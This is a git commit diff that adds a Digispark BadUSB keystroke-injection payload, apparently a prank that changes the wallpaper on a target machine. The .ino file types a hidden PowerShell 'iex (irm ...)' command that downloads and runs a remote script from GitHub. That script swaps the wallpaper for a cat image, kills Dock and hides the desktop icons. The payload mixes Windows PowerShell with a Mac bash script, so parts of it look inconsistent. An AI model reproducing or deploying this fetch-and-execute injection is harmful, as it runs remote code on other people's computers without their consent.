af5e58b67745d27e156dc8a49056af10ece85224
msr8 <live.shashwat@gmail.com>
2022-10-07 17:38:59 +0530

    added wallpaper_mac.ino

---
+++ Payloads/Wallpaper Changer/wallpaper_mac.ino
@@ -0,0 +1,28 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  // empty
+}
+
+void loop() {
+  // Initialise digispark
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(600);
+
+  // Opens the run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+
+  // Writes the command
+  DigiKeyboard.print("powershell -w h ");
+  DigiKeyboard.print("iex (irm \"");
+  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/bash/wallpaper.sh");  // LINK HERE
+  DigiKeyboard.print("\")");
+  // Enters it
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+
+  for (;;) {/* Stops the loop */}
+}
+
--- Shell Scripts/bash/wallpaper.sh
+++ Shell Scripts/bash/wallpaper.sh
@@ -1,5 +1,17 @@
 # Downloads a random cat from the Assets folder
+fn="$((1 + RANDOM % 6))"
+curl "https://raw.githubusercontent.com/msr8/attiny85/main/Assets/cat$(echo $fn).jpg" > "$TMPDIR/15791817.jpg"
 
-# Changes the wallpaper
+# Changes the wallpaper, https://apple.stackexchange.com/a/348454 & https://stackoverflow.com/a/16825976/17002774
+osascript -e "tell application \"System Events\" to tell every desktop to set picture to \"$(echo $TMPDIR)/15791817.jpg\""
+osascript -e "tell application \"System Events\" to tell process \"System Preferences\"
+    tell pop up button 2 of tab group 1 of window 1
+        click
+        click menu item \"Stretch to Fill Screen\" of menu 1
+    end tell
+end tell"
+killall Dock
 
 # Hides the icons
+defaults write com.apple.finder CreateDesktop false
+killall Finder
